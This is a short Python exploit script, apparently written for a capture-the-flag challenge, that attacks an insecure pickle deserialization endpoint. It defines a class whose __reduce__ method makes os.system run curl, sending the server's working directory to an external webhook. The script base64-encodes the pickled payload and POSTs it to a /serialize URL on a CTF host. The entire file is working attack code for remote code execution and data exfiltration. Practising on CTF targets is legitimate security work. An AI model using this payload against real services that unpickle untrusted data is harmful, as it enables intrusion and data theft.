#!/usr/bin/env python3
import pickle
import os
import base64
import requests

class P(object):
    def __reduce__(self):
        return (os.system,("curl https://webhook-test.com/887f7a463e73171d4848dd9f4da6639f -d \"$(pwd)\"",))

def main():
    print(P().__dict__)
    pickledPayload = base64.b64encode(pickle.dumps(P())).decode()
    print(f'[*] Payload: {pickledPayload}')

    URL = 'http://ctf.compfest.id:7304/serialize'

    print('[*] Request result:')
    orderRequestResult = requests.post(URL, json={"data":pickledPayload}, headers={"Content-Type": "application/json"})
    print(orderRequestResult.text)

if __name__ == '__main__':
    main()
